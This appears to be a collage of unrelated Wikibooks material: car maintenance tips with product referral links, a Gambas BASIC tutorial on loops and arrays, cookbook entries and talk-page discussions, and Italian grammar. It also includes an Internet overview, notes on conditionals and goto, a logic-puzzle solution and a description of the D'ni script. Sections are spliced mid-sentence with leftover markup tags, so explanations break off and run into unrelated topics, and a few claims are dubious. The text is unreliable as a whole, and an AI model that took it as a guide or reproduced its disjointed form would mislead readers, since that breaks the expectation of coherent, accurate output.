      <text xml:space="preserve">There are many alternatives to automobile transport. For example, you can walk, bike, or take public transit whenever possible. Don't idle your vehicle. Carpool. Take the bus or train instead of driving long distances. Fill up your tires - improves mileage. Buy a gas-electric hybrid (it never needs to be plugged in), or a diesel.

==Automobile Maintenance for a Greener Ride== 
*Maintain your car properly
**Clean your air system by periodically replacing your car's air filter
**Clean your throttle body/air intake with a strong auto detergent like SeaFoam, STP Throttle body/Air Intake cleaner (1/2 hr job for a person new to cars). Remember to get the right spray can, ask the manager of the store. If you have a fuel injected car, using the carburated cleaner can cause unpleasant surprise. 
**Clean your fuel system by using a fuel system cleaner like Techron, [http://www.amsoil.com/StoreFront/SearchResult.aspx?CategoryID=134&amp;zo=1122941 Amsoil's PI]
**Use synthetics for your engine oil, transmission, power steering etc. I recommend Amsoil products as they last much much longer than any well known brands like Castrol. For the typical car (with automatic transmission) use of [http://www.amsoil.com/StoreFront/SearchResult.aspx?CategoryID=1&amp;zo=1122941 Series 2000 0W-30] for engine oil, ATF for transmission and power steering. Ask Amsoil technical support for help.
** Keep tires inflated. Under-inflated tires reduce gas passage.
** Do tire rotation, balancing and alignment regularly as prescribed in user's manual. This will increase lifetime or tire which are rarely restored or recycled and most likely burnt.
** Do oil changes promptly. Clean oil reduces carbon dioxide emission. Change oil as prescribed in car user's manual, not every 3,000 miles as recommended by oil changing services.
* If you're in the market for a new car anyway, consider getting a car with an order of magnitude better mileage.
* Drive less:
** Designate one day each week as a car-free day.
** If possible, consider one car-free weekend each month.
* Share ride to work with colleges. Carpool lines are also faster during traffic time.

==Loops== 

===Introduction to loops===

Loops are powerful control structures used to repeat a given section of code a certain number of times or until a particular condition is met.

Gambas has three main types of loops:  '''for / next''' loops , '''do''' loops and '''for / each''' loops.

===For / Next Loops=== 

The syntax of a '''for / next''' loop has three components:  
*a counter, 
*a range, and 
*a step.  
A basic '''for / next''' loop appears as follows: &lt;br&gt;&lt;br&gt;
     for X = 1 to 100 step 1
        print X
     next 

In this example, X is the counter, &quot;1 to 100&quot; is the range, and &quot;1&quot; is the step.

When you want to make a complete example out of that , you need a form and a command button and this following code.

 PUBLIC SUB Button1_Click()
 X AS Integer
  for X = 1 to 100 step 1
        print X
  next
 END
   
The variable X has to be declared as an integer. 

When a '''for / next''' loop is initialized, the counter is set to the first number in the range -- in this case, X is set to 1.  The program then executes any code between the '''for''' and '''next''' statements normally.  Upon reaching the '''next''' statement, the program returns to the '''for''' statement and increases the value of the counter by the step.  In this instance, X will be increased to 2 on the second iteration, 3 on the third, etc.

To change the amount by which the counter variable increases on each iteration, simply change the value of the step.  For example, if you use a step 2, X will increase from 1 to 3, then to 5, 7, 9, and so on.  When the step is not explicitly stated, step 1 is used by default.  (Note that the step can be a negative value.  For instance, &quot;for X = 100 to 1 step -1&quot; would decrease the value of X from 100 to 99 to 98, etc.)

When X reaches the maximum value in the range (100 in the example above), the loop will cease to execute, and the program will continue to the code beyond the '''next''' statement.

It is possible to edit the value of the counter variable within a '''for / next''' loop, although this is generally considered bad programming practice:
     for X = 1 to 100 step 1
        print X
        X = 7
     next 

While you may on rare occasions find good reasons to edit the counter in this manner, the example above illustrates one potential pitfall:  Because X is set to 7 at the end of every iteration, this code creates an infinite loop.  To avoid this and other unexpected behavior, use extreme caution when editing the counter variable!

Try some more examples to get used to loops:


 PUBLIC SUB Button1_Click()
 i AS Integer
 FOR i = 1 TO 10
  PRINT &quot;Hallo Welt&quot;
 NEXT
 END


 PUBLIC SUB Button1_Click()
 DIM i AS Integer
 FOR i = 1 TO 10
   PRINT i,i*i,i*i*i
 NEXT
 END

To make loops better readable, you should move the inner lines of code to the right. They will be repeated in the loop. In contrary to VB you should not mention the counter at the end of the loop behind the next command.

 For I = 1 to 10 
  print I
 ' Next I    VB code
 ' skipped in Gambas because it is redundant 
 Next

===Do Loops=== 

Do loops are a bit more flexible then For loops, but should generally only be used when neccesary. Do loops come in the following formats: &lt;br&gt;
-Do while&lt;br&gt;
-Do until&lt;br&gt;
-Loop while&lt;br&gt;
-Loop until&lt;br&gt;
While loops (both do while and loop while) will continue to execute as long as a certain conditional is true. An Until loop will loop as long as a certain condition is false, on the other hand. The only difference between putting either While or Until in the Do section or the Loop section, is that Do checks when the loop starts, and Loop check when the loops ends. An example of a basic loop is as follows: &lt;br&gt;&lt;br&gt;
     Do
        print &quot;hello&quot;
        x=x+1
     Loop until x=10

This loop will print hello several times (depending on the initial value of x. As you may have noticed, Do loops have no built in counters. However, they may be made manually as shown above. In this case, I chose x as my counter variable, and every time the loop execute, x increase itself by one. When X reaches 10, the loop will cease to execute. The advantage of Do loops is that you may exit at any time whenever any certain conditional is met. You may have it loop as long as a certain variable is false, or true, or as long as a variable remains in a certain range.

===Nested Loops===

A nested loop is any type of loop inside an already existed loop. They can involve any type of loop. For this, we will use For loops. It is important to remember that the inside loop will execute its normal amount multiplied by how many times the exterior loop runs. For example:&lt;br&gt;

     For i = 1 to 10
        For j = 1 to 10
            print i*j,
        Next 
       print 
     Next 



This will print the times table. Upon the first pass of the i loop, it will run the j loop ten times. Then on the second pass of the i loop, it will run the j loop another ten times, and so on.
Why is there another print command between the two next commands. Try it out, what you will get, when you delete  it.

      <text xml:space="preserve">Where are you getting &quot;Black Turtle Bean&quot; and &quot;Black-eyed pea&quot; from?
These are really non-standard names.

----

Ow, this is looking painful, especialy for the black-eye bean.
I think cowpea sounds disgusting, but if that's the standard, OK.

The black bean is easier. First of all, black varieties of other
beans don't count as conflicts. The Chinese one is actually the
soybean, black due to fermentation, so that doesn't count either.
Thus there are no conflicts. The black bean article might note the
name issue though.

In any case, the articles need to list all the variants, and there
should be REDIRECT entries for the secondary names.

[[User:AlbertCahalan|AlbertCahalan]] 07:31, 15 Feb 2005 (UTC)

As I understand it, you won't be likely to get a bag of black beans
from an asian market. You'd get black bean paste or black bean sauce.

I can live with ''black-eyed pea''. It'll always be a bean to me though.
Black bean obviously works, with a &quot;see also&quot; for the other stuff.
Don't forget the redirect from turtle bean though.

Hello,

The developer team at Wikimedia is making some changes to how accounts work, as part of our on-going efforts to provide new and better tools for our users like cross-wiki notifications. These changes will mean you have the same account name everywhere. This will let us give you new features that will help you edit and discuss better, and allow more flexible user permissions for tools. One of the side-effects of this is that user accounts will now have to be unique across all 900 Wikimedia wikis. See [[m:Special:MyLanguage/Single User Login finalisation announcement|the announcement]] for more information.

Unfortunately, your account clashes with another account also called Pekinensis. To make sure that both of you can use all Wikimedia projects in future, we have reserved the name Pekinensis~enwikibooks that only you will have. If you like it, you don't have to do anything. If you do not like it, you can [[Special:GlobalRenameRequest|pick out a different name]].

Your account will still work as before, and you will be credited for all your edits made so far, but you will have to use the new account name when you log in.

Sorry for the inconvenience.

Yours,&lt;br /&gt;[[m:User:Keegan (WMF)|Keegan Peterzell]]&lt;br /&gt;Community Liaison, Wikimedia Foundation

This recipe is completely useless in some countries. It's one thing to use a particular system of measurement, which is more-or-less easily converted. It's another thing entirely to go by mass.
Most kitchens do not have a balance or scale. Kitchen scales are generally unavailable in the USA;
one would need to go to a home-brewing or laboratory supplier to get a suitable scale.

Also, how big is your medium egg anyway? If this is the normal size for you, then it is likely to be equivalant to a USDA-standard large egg in the USA.

Eggs lose water as they age. If you're going to weigh your eggs, you should probably be doing so for the purpose of adding enough water to bring them up to their original (standard) weight.

==unlikely to be right==
It says:

Sodium bicarbonate (2tsp) (Baking Powder, Baking Soda or Bicarbonate of Soda)

Uh, no. While baking powder has acid, the others (all meaning the smae thing) do not.
I would normally expect the odd entry (baking powder) to be wrong, but this recipe has
no source of acid that I can spot. Thus, I'll guess that only baking powder will work.

Anybody mind baking both a sponge cake and a disaster? Then we'll know.

:I'm changing my guess. Baking powder is a recent invention. This recipe is claimed to go back 140+ years.

::Oh, never mind. This ingredient is not used! Probably with the self-rising flour...


==Why oh why is it called &quot;Impossible&quot;?==
The serious answer to this question might be added if only for my curiosity. :-)
Or is that only because they don't have scales in the USA?

A picture for the final result would be nice. [[User:JonathanHopeThisIsUnique|JonathanHopeThisIsUnique]] ([[User talk:JonathanHopeThisIsUnique|discuss]] • [[Special:Contributions/JonathanHopeThisIsUnique|contribs]]) 20:41, 24 July 2014 (UTC)</text>

      <text xml:space="preserve">{{ingredient}} | [[Cookbook:Oil and fat|Oil and fat]]
[[Image:Chleb ze smalcem.jpg|right|thumb|Bread spread with lard]]

'''Lard''' is [[Cookbook:Fat|fat]] (the thick oil, not the fat tissue) from a pig.
Unlike normal [[Cookbook:Shortening|shortening]], which can be used as a lard substitute, lard is free of trans-fatty acids.
Lard is also lower in saturated fat than [[Cookbook:Butter|butter]], making lard one of the best of the well-known solid fats. Lard is slightly softer than '''Crisco''' shortening.

Lard is particularly important for traditional [[Cookbook:Pie|pie]] [[Cookbook:Pie Crust|crusts]], such as the one for [[Cookbook:Apple Pie|apple pie]]. Lard gives the desired flakey texture.
Substitution is not advised. Lard also makes for better [[Cookbook:Biscuit|biscuits]], and can be used in [[Cookbook:Roast Potatoes|roast potatoes]].

Lard does not last quite as long as shortening does. Refrigeration will help. Refrigeration is a good idea anyway, because the [[Cookbook:Pastry|pastry]]-like foods commonly made with lard will turn out best if everything ([[Cookbook:Ingredients|ingredients]], air, [[Cookbook:Rolling Pin|rolling pin]], work surface, bowls, etc.) is kept cold until [[Cookbook:Baking|baking]].

Larding is the process by which [[Cookbook:Lardon|lardons]] (bits of lard) are injected into meat. This is sometimes done before cooking a tough piece of meat.

Lard can be produced by [[Cookbook:Baking|baking]] a [[Cookbook:Pork|pork]] roast, preferably with some cuts in the fat tissue to let the lard drain out. If the drippings are allowed to sit in a tall glass container, lard will float to the top. Be sure to allow enough time for the non-lard content to settle out; reheating may be required. Once settled, the lard must be refrigerated. Home-made lard can have a bit of a roast pork flavor, which is very good for making [[Cookbook:Refried Beans|refried beans]].

[[Cookbook:Bacon|Bacon]] grease is essentially lard.

      <text xml:space="preserve">== Adjectives / Aggettivi ==
Unlike in English, adjectives may be placed both before or after the noun.

&lt;b&gt;Example:&lt;/b&gt;
 La grande città (''the large town'')
 La città grande (''the large town'')
 - are both correct, with slightly different meaning

As a general trend, adjectives tend to follow nouns rather than precede them.

Adjectives must agree with the noun they modify both in gender (masculine or feminine) and in number (singular or plural).

&lt;b&gt;Examples:&lt;/b&gt;
 La macchina rossa (''the red car'')
 Le macchine rosse (''the red cars'')
 Il divano rosso (''the red sofa'')
 I divani rossi (''the red sofas'')

&lt;b&gt;Endings for adjectives:&lt;/b&gt;
 Masc.sing.  Fem.sing.   Masc.plur.  Fem.plur.
     o           a           i          e
     e           e           i          i

Adjectives that end in -e do not need to modify their endings for gender.  Their endings change only depending on whether the noun is singular or plural.

&lt;b&gt;Example:&lt;/b&gt;
 Il libro verde (''the green book'')
 La porta verde (''the green door'')
 I libri verdi (''the green books'')
 Le porte verdi (''the green doors'')

:: A crosslisting of pastry to [[Cookbook:Bread]] and [[Cookbook:Dessert]] might be ok, though pastry isn't exclusively a dessert item (croissants, pot pies, etc) [[User:Kellen|Kellen]] 19:37, 18 May 2005 (UTC)

I've started a list of recipes involving pastry, though I don't know if this is actually very useful. It might be better to just add said recipes to a &quot;Pastry&quot; category. Comments? [[User:Kellen|Kellen]] 21:31, 18 May 2005 (UTC)

:Be careful. A good number of those pies use crumb crusts, not pastry. [[User:AlbertCahalan|AlbertCahalan]] 22:10, 18 May 2005 (UTC)

::Ha. I hadn't checked; that is a good point. Do you think this is actually a useful expenditure of time/effort, though? I'm torn since most people aren't looking for &quot;something involving pastry.&quot; [[User:Kellen|Kellen]] 22:15, 18 May 2005 (UTC)

:::It's not all that useful, and might be hard to maintain. Sorting the pies by type might be more useful, or just marking them on the desert page with notes like &quot;(pastry, fruit)&quot; or &quot;(crumb, cream)&quot;. I guess the pastry page should be more about how to make nice pastry. In that case, it needs to mention that one must use [[Cookbook:Lard|lard]] for the very best pastries. Also, the temperatures of ''everything'' (surface, rolling pin, ingredients, air...) will matter. A refrigerated marble rolling pin on a refrigerated marble surface would be ideal. [[User:AlbertCahalan|AlbertCahalan]] 22:27, 18 May 2005 (UTC)

:::: Should we move it out of &quot;Recipes&quot; on the front page then, since it'd be more about technique? [[User:Kellen|Kellen]] 22:32, 18 May 2005 (UTC)

::::: Definitely. I just did that. [[User:AlbertCahalan|AlbertCahalan]] 22:47, 18 May 2005 (UTC)

:::::: This page is a bit of an orphan now. I linked it from [[Cookbook:Baking]] but that page is more about baking as a _cooking_ technique than a class of preparation. The breakdown of subjects on the frontpage of the cookbook is not really satisfactory to me, but I'm unclear on how it should be modified to fit a subject like this.

== Today's Internet ==
[[Image:Internet.png|thumb|400px|Different Internet applications, such as [[w:Web browser|Web browser]]s, [[w:FTP|FTP]], and [[w:Telnet|Telnet]]]]

Apart from the incredibly complex physical connections that make up its infrastructure, the Internet is held together by bi- or multi-lateral commercial contracts (for example peering agreements) and by technical specifications or protocols that describe how to exchange data over the network.  

Unlike older communications systems, the Internet protocol suite was deliberately designed to be agnostic with regard to the underlying physical medium. Any communications network, wired or wireless, that can carry two-way digital data can carry Internet traffic. Thus, Internet packets flow through wired networks like copper wire, coaxial cable, and fiber optic; and through wireless networks like Wi-Fi. Together, all these networks, sharing the same high-level protocols, form the Internet.

The Internet protocols originate from discussions within the Internet Engineering Task Force (IETF) and its working groups, which are open to public participation and review. These committees produce documents that are known as Request for Comments documents (RFCs). Some RFCs are raised to the status of Internet Standard by the Internet Architecture Board (IAB).

Some of the most used protocols in the Internet protocol suite are IP, TCP, UDP, DNS, PPP, SLIP, ICMP, POP3, IMAP, SMTP, HTTP, HTTPS, SSH, Telnet, FTP, LDAP, SSL, and TLS.

Some of the popular services on the Internet that make use of these protocols are e-mail, Usenet newsgroups, file sharing, the World Wide Web, Gopher, session access, WAIS, finger, IRC, MUDs, and MUSHs. Of these, e-mail and the World Wide Web are clearly the most used, and many other services are built upon them, such as mailing lists and web logs. The Internet makes it possible to provide real-time services such as web radio and webcasts that can be accessed from anywhere in the world.

Some other popular services of the Internet were not created this way, but were originally based on proprietary systems. These include IRC, ICQ, AIM, and Gnutella.

There has been much analysis of the Internet and its structure. For example, it has been determined that the Internet IP routing structure and hypertext links of the World Wide Web are examples of scale-free networks.

Similar to how the commercial Internet providers connect via Internet exchange points, research networks tend to interconnect into large subnetworks such as:

* GEANT
* Internet2
* Little GLORIAD

These in turn are built around relatively smaller networks.

      <text xml:space="preserve">Hello all Im new to Wikopedia and Wikiversity and Im not quite familiar with everything yet. I would like to contribute as much as possible to any of these projects because the simple idea of creating such a site is by far a demonstration of the best that we as a species can offer one another.

[[Image:BreadKnife.jpg|thumb|right|Bread Knife]]
A '''bread knife''' is a straight, long, slender knife with a [[Wikipedia:Serration|serrated]] edge, used for slicing bread.

Some bread knives have an offset handle, so that the cook's knuckles don't scrape the cutting board.</text>

      <text xml:space="preserve">I think that all the names for recipes that do not actually have any recipes attached (those from Poland, for example) should be deleted. They clutter up the page.

:I half-way agree with you. I think the question to ask is, will the recipe be created? For example, I expect that somebody will fill in the Pineapple Upside-Down Cake. Some of the other stuff is pretty obscure though.

::A few common recipes that someone might fill in later are ok. But someone added Polish recipe names everywhere in the cookbook and never came back to add the actual recipe. I think that all of those should be deleted.</text>

I spotted you arguing that due process should be followed in deleting things. I strongly agree,
especially since deletion is a destructive action that normal users are generally unable to investigate.

I wonder if you could support me in a [[Wikibooks:Requests_for_adminship|request for adminship]]. I had originally just been hoping to kill typos like the page that starts with Coobkook instead of Cookbook.
I now discover that the VfD process is getting bypassed even for pages with content, which is a disturbing violation of policy.
I'd like to be able to see the deleted pages so I can investigate this, and thus need admin access for that reason also. As soon as I mentioned this, I got opposition from someone who was supporting the vote-free content deletion.

In case you have a Linux box and wish to verify my identity, do &quot;man ps&quot; and email the maintainer.

Otherwise, note that I have contributed over two dozen original recipes to the [[Cookbook]]. I suspect I may be the number one recipe contributer in fact. I have added many more ingredients, from Water to Tomato, and added zillions of missing headers and links.

*In no particular order:
**IF I use Linux? ;)
**You seem to have made lots of good contributions, which should be the main criteria for becoming an administrator.
**Can you be entirely clear that you won't be undeleteing pages without agreement on the votes for undeletion page? IMHO, undeletions without due process are just as bad as deletions without due process.
**Can you try to [[w:Wikipedia:Assume good faith|assume good faith]]? Although I agree MSholne should stop accusing wikipedians of being sockpuppets (I've seen it on [[VfD]] and [[Wikibooks:Requests_for_adminship]]) the indentation thing might have just been an accident. -- [[meta:User:Mattrix|mattrix]] 09:47, 14 Feb 2005 (UTC)

Of course I won't be undeleting articles without agreement. Among other reasons, I'd lose the admin bit in about 2 seconds, wouldn't I? In any case, I have a real name with some sort of a reputation.

(hopefully you don't count different-content-same-name, or the grabbing of good bits out of an otherwise awful article that should remain deleted)

I fixed the Assume_good_faith link above. I'll guess it is a reference to my suspicion of MSholne's edit. Hmmm, I suppose it is possible to make such a mistake, just barely. He is presumably experienced in editing wiki text though. I guess it would have been best to merely note the error and let the audience judge for themselves. (changing that now: acceptable or not?) There is a painful unfairness in this, as he judged one of my articles to be some sort of very-intentional bad joke.

Thanks for your reply. I'm not entirely sure about people actually running a campaign to become admin but there is no policy against it AFAIK so I won't count it against you. -- [[meta:User:Mattrix|mattrix]] 19:55, 14 Feb 2005 (UTC)

== better? ==

I think I've made the note at the top of the [[Cookbook:Native American cuisine]] page less offensive. How'd I do?

BTW, the inter-wiki redirect on your user page is dead. I believe that inter-wiki redirects are globally disabled to prevent abuse.

== A-Level Maths - Differentiation ==
''reply to [[User talk:Krackpipe#A-Level Mathematics]]''

I have been working from the textbook entitled &quot;MEI Structured Mathematics&quot;, which is for the OCR specification. In this textbook, differentiation is in the second half of the textbook called &quot;C2: Concepts for Advanced Mathematics&quot;. In addition to this, differentiation was in the C2 exam I took last May.

&lt;strike&gt;I was going to suggest that we have separate index pages and TOC's for each specification, but it seems we are working from the specification of the same examining body, OCR. This is very odd, and I will have to look into it. Perhaps you are doing the non-MEI course, if such a thing exists? &lt;/strike&gt;

I have just investigated the differenent specifications and there is a difference between the MEI course and the non-MEI course from OCR, [http://www.ocr.org.uk/OCR/WebSite/Data/Publication/Specifications%2c%20Syllabuses%20%26%20Tutors%20Handbooks/AS_A_Level425831.PDF and as you can see here] differentiation is on C2. I think seperate index pages for each specification should be made once there is more content. I am going to concentrate on writing the pages first, and then I will make several index pages for each specification.

Thanks, --[[User:Krackpipe|Krackpipe]] 10:11, 2 August 2005 (UTC)

You seem to oppose the [[m:Deletionism|deletionism]] here on wikibooks. Am I right?
Deletion is a destructive action that normal users are generally unable to investigate,
and many messed-up books/articles/modules can be repaired in time.

I wonder if you could support me in a [[Wikibooks:Requests_for_adminship|request for adminship]]. I had originally just been hoping to kill typos like the page that starts with Coobkook instead of Cookbook.
I now discover that the VfD process is getting bypassed even for pages with content, which is a disturbing violation of policy.
I'd like to be able to see the deleted pages so I can investigate this, and thus need admin access for that reason also. As soon as I mentioned this, I got opposition from someone who was supporting the vote-free content deletion.

In case you have a Linux box and wish to verify my identity, do &quot;man ps&quot; and email the maintainer.

Otherwise, note that I have contributed over two dozen original recipes to the [[Cookbook]]. I suspect I may be the number one recipe contributer in fact. I have added many more ingredients, from Water to Tomato, and added zillions of missing headers and links.

[[Image:MeasuringCups.jpg|thumb|right|Measuring Cups]]

A '''measuring cup''' is a handled cup used for measuring ingredients. They usually come in sets of 1 cup (240 mL), 1/2 cup (120 mL), 1/3 cup (80 mL) and 1/4 cup (60 mL).  Metric measuring cups also exist based on a cup of 250 mL and divisions thereof.

Those designed for dry ingredients contain the measured amount of an ingredient when full up to the top edge of the cup, and can be levelled with a straight edge (such as a spatula or knife) to get the precise amount.

Cups designed for liquids often contain markings (graduations) for various levels along the sides, and contain the full amount slightly below the top, often having a pouring spout as well.</text>

==Traditional Cuisine==

Most famous for its tourtière, pea soup, baked beans, ham dishes, stew of pig legs and maple desserts, Quebec's traditional cuisine is today being rediscovered as rich and diverse as its immense territory.

The '''temps des sucres''' (sugar season) is one of the oldest of Quebec culinary traditions. During springtime, many Quebecers go to ''cabanes à sucre'' (sugar shacks) for a traditional meal that features eggs, baked beans, ham, and bacon, which they then cover in maple syrup. Associated activities are a horse-drawn sleigh ride in the woods and ''tire sur la neige''- boiled maple syrup dribbled over snow, which then hardens, and is eaten as a treat.

==Contemporary Cuisine==

Contemporary Quebec cuisine is characterized by a creative use of all things native to the land which are then prepared following all contemporary trends of the world.

Famous products of contemporary Quebec cuisine include poutine and whippet cookies. The Jewish community of Montreal has contributed Montreal-style bagels and smoked meat which is similar to pastrami.

      <text xml:space="preserve">== Conditionals ==

Conditional clauses are blocks of code that will only execute if a particular expression (the condition) is [[w:Truth function|true]].

=== ''if''-''else'' ===

The ''if''-''else'' statement is the simplest of the conditional statements. They are also called branches, as when the program arrives at an ''if'' statement during its execution, control will &quot;branch&quot; off into one of two or more &quot;directions&quot;. An ''if''-''else'' statement is generally in the following form:

The green house is not number 2, which is blue.  Consequently and from clue 4, it is not 1 or 5.  The green house resident drinks coffee, therefore the house is not 3 (whose resident drinks milk).  Therefore the green house is 4, and the white house is 5.

This leaves determining the colours of houses 1 and 3.  The red house is not number 1 (residents are English and Norwegian respectively) so 3, and house 1 is yellow.

From clue 12, horses are kept in the grounds of house 2.  The Norwegian doesn't drink tea (the Dane does) or beer (the Blue Master smoker does) so water.  Hence from clue 15, the Blend smoker lives in house 2.  We now have:

|}
from which most of the information easily falls into place:
{| border=&quot;1&quot;

|-
| '''Pet'''         ||           || horses || birds     ||        || dogs
|}
Finally, clue 10 tells us that the Norwegian keeps cats, and the German keeps fish.

      <text xml:space="preserve">The puzzle is impossible to solve as it stands.  Only three drinks (coffee, milk, orange juice) and only three pets (dog, snail, fox) are mentioned in the clues.  Hence there is no means of determining either who drinks water as opposed to the other unmentioned drink, or who keeps a fish rather than the other unmentioned pet.

Also, one nationality has been omitted from the clues.  But this only prevents the puzzle from being solved if it is the answer to either of the questions. -- [[User:Smjg|Smjg]] 17:52, 14 Feb 2005 (UTC)

Unconditionals let you change the flow of your program without a condition. You should be careful when using unconditionals. Often they make programs difficult to understand. Read [[#Isn.27t_goto_evil.3F|Isn't goto evil?]] for more information.

=== ''return'' ===

End a function and return to the calling procedure or function.

      <text xml:space="preserve">==== Isn't ''goto'' evil? ====

One often hears that ''goto'' is '''evil''' and one should avoid using ''goto''. But it is often overlooked that any return which is not the last statement inside a procedure or function is also an unconditional statement &amp;mdash; a ''goto'' in disguise.  There is an important difference though: a return is a forward only use of ''goto''.  Exceptions are also a type of goto statement; worse, they need not specify where they are going to!

Therefore if you have functions and procedures with more than one ''return'' statement you can just as well use ''goto''. When it comes down to readability the following two samples are almost the same:

      <text xml:space="preserve">Because the use of a ''goto'' needs the declaration of a label, the ''goto'' is in fact twice as readable than the use of ''return''. So if readability is your concern and not a strict &quot;don't use ''goto''&quot; programming rule then you should rather use ''goto'' than multiple ''return''s. Best, of course, is the structured approach where neither ''goto'' nor multiple ''returns'' are needed:

Loops allow you to have a set of statements repeated over and over again.

=== Endless Loop ===

The endless loop is a loop which never ends and the statements inside are repeated forever. Never is meant as a relative term here &amp;mdash; if the computer is switched off then even endless loops will end very abruptly.

This loop has a condition at the beginning.  The statements are repeated as long as the condition is met.  If the condition is not met at the very beginning then the statements inside the loop are never executed.

Sometimes you need to first make a calculation and exit the loop when a certain criterion is met. However when the criterion is not met there is something else to be done. Hence you need a loop where the exit condition is in the middle.

Quite often one needs a loop where a specific variable is counted from a given start value up or down to a specific end value. You could use the [[#Loop with condition at the beginning|while]] loop here &amp;mdash; but since this is a very common loop there is an easier syntax available.

[[Image:Wooden Spoon.jpg|thumb|left|A wooden spoon]]

A '''wooden spoon''' is a long handled kitchen spoon made from wood usually used for stirring.

Supposedly, sanitation of wooden spoon can be problematic, because bacteria get into the pores of the wood. However, in practice, this is not a major difficulty if the spoon is used only to stir boiling mixtures, and is washed and dried properly between uses.

The wood can be maintained with the addition of rubbing it down in mineral oil after washing, do not use vegetable oil as this can go rancid.

== Edit Conflict ==
Something very bad just happened on the VfD page.

#I added a comment. (no warning about a conflict, at least I didn't see one)
#I tried to revert
#I got some sort of a conflict, I think with you
#It appears that you did the revert, merging in my comment and adding a follow-up

Is that what happened?

(if so, you are '''fast''' at editing) --14 February 2005 [[User:65.34.186.143]]

== Sock Puppets ==

You accused me of being a sock puppet, which was kind of understandable considering my very recent registration on Wiki books and my very small amount of edits. However I am not a sock puppet and the only reason I do not have many edits on Wiki Books is that i Mainly edit Wikipedia and only had cause to register on Wiki Books to vote on the VFU. I have in fact previously discussed this subject as an anon. If you want to check this my first edit to the discussion was before I realised I was not registered on Wiki Books, so it bears my IP address, I then added the tildes as my account, but the entry before it in the edit list is my IP.

Could you Please withdraw your allegation. It is understandable that you might reach the conclusion that you did but it is incorrect

== Manual of Crime ==

Thanks for pointing out that I neglected to sign my Manual of Crime vote against undeletion.  I am rather embarassed that I forgot to do so.  I have signed it now. --[[User:JMRyan|JMRyan]] 19:44, 1 December 2005 (UTC)</text>

==A simple array==
An array is a '''list, filled with variables of the same type'''.
*You can fill an array with all the weekdays of a week. 
*You can fill an array with the name of all the months of a year. 
*You can fill it with the names of a class in your school. 
*You can fill it with the numbers 0-9 and so on.
Arrays will shorten the length of your code, because all the members of the array can be reached with one loop.
Every element of an array can be reached by its position in the array. 
Be careful: '''The first variable has the position zero.'''

Example:

The following list of names shall be stored in an array

Jack, John , Anne , Alice

You can use the array command for that.
The output is done with a for-each loop.

The program: You need a form and a commandbutton to get it going. 

 ar AS String[]
 ' a string array is defined
 PUBLIC SUB Form_Open()
  ar = Array(&quot;Jack&quot;,&quot;John&quot;,&quot;Anne&quot;,&quot;Alice&quot;)
  ' the array is filled
 END
 PUBLIC SUB Button1_Click()
  element AS String 
  FOR EACH element IN ar 
   PRINT element
  NEXT
 ' the array is printed into the terminal window
 END

==The Array command==

The Array command is used with the following syntax:

 array = Array ( Expression , ... ) 

It creates an array and returns it. The type of the array is the type of the first expression. The other expressions are automatically converted. 
You can use the square bracket syntax as an alternative to the Array() subroutine. 

Examples 

 PRINT Object.Type(Array(2.4, 3, 3.2))
&gt; Float[]

 PRINT Object.Type(Array(&quot;2.4&quot;, 3, 3.2))
&gt; String[]

 PRINT [ &quot;A&quot;, &quot;B&quot;, &quot;C&quot; ].Join(&quot;/&quot;)
&gt; A/B/C

==The Addy program==
In the following example an array is filled with integers. Then the elements are looked up in a for-each loop and added together. 
This miniprogram calculates the sum of a row of integers. 
You need 1 textarea, 1 textbox and 1 commandbutton to get the program going. 
You can also add negative integers. 
Very helpful is the Splitcommand and the Stringarray String[] 

The Code: 

 PUBLIC SUB Button1_Click()
 text AS String
 summe AS Float
 elt AS String[]
 Sb AS String
 text = textarea1.Text
 elt = Split(text,Chr(10))
 FOR EACH Sb IN elt
  summe = summe + Val(sb)
 NEXT
 textbox1.Text = summe
 END

When you start the programm, you can fill any number into the textarea. When you want to add another number just push the RETURN button.

==The Split command==

 Array = Split ( String [ , Separators , Escape ] ) 

This command splits a string into substrings delimited by Separators . Escape characters can be specified: any separator characters enclosed between two escape characters are ignored in the splitting process. 

Note that Split takes only three arguments: if you want to use several separators, you should pass them as the second parameter, concatenated in a single string. 
By default, the comma character is the separator, and there are no escape characters. 
This function returns a string array filled with each detected substring. 

Example: you need a command button on your form to get it going.

 PUBLIC SUB Button1_Click()
 DIM Elt AS String[]
 DIM Sb AS String
 Elt = Split(&quot;Gambas Almost Means BASIC ! 'agree ?'&quot;, &quot; &quot;, &quot;'&quot;)
 FOR EACH Sb IN Elt
  PRINT Sb
 NEXT
 End

Output in the terminal window:

 Gambas
 Almost
 Means
 BASIC
 !
 agree ?

      <text xml:space="preserve">==Letter order and formation==
The D'ni alphabet is in this order, here followed by its standard Latin transcription and its pronunciation. The letters are constructed by three elements: ''head, base'' and ''accent''. Letters 1, 2, 3 and 4, have no base, and 5, 10, 15 and 20 have no head. Note that the abovementioned letters are derived from the respective numbers. The order of the letters is constructed by the combinations of heads and bases, when put on a table. The [[../Alphabet_and_Phonology#Accent|accent]] is added to some of them to modify their sound.

==Stress==
There is no trace about stress rules, if any, or if every word has its own stress.

As it seems from the Riven actors, the re- prefix isn't stressed ( re-vAt), possessive adjective suffixes are stressed (tah-Om), the silent sound of the apostroph is stressed (t-UH-rekhoy D-UH-ni) and verbs are stressed to their first tense prefix (bO-dona) or to their stem, not adjective suffix (kEn-en)... generally the words seem to be stressed on their last or second to last syllable...

==Punctuation==

Three punctuation marks are attested:

{| border=&quot;1&quot;
|Full-start
|&lt;font face=&quot;D\'ni Script&quot;&gt;&lt;font size=&quot;+1&quot;&gt;&amp;nbsp; . &lt;/font&gt;&lt;/font&gt;&amp;nbsp;
|&amp;nbsp;.&amp;nbsp;
|-
|Apostrophe
|&lt;font face=&quot;D\'ni Script&quot;&gt;&lt;font size=&quot;+1&quot;&gt;&amp;nbsp; ‘ &lt;/font&gt;&lt;/font&gt;&amp;nbsp;
|&amp;nbsp;'&amp;nbsp;
|-
|Dash
|&lt;font face=&quot;D\'ni Script&quot;&gt;&lt;font size=&quot;+1&quot;&gt;&amp;nbsp; - &lt;/font&gt;&lt;/font&gt;&amp;nbsp;
|&amp;nbsp;-&amp;nbsp;
|}

The full start is like our full-stop, but unlike ours, it's used to indicate the beginning of the sentence, e.g.:

.I am hungry .I want to eat

The function of the dash is not attested, but it's supposed to indicate similarly the beginning of a paragraph.

The apostrophe is identical to the accent and it is generally used to unite prepositions with word stems. For more on this refer to chapter [[../Prepositions/]]. There are many words having apostrophes and we suppose they indicate contracted forms of older, longer words.. We only know that D'ni is pronounced like Dunny, we have therefore a stressed Schwa (a ‘neutral’ sound, close to a).

==Transliteration==
When transcribing D'ni using the Latin alphabet, two different standards are used.

===Old Transliteration Standard (OTS)===
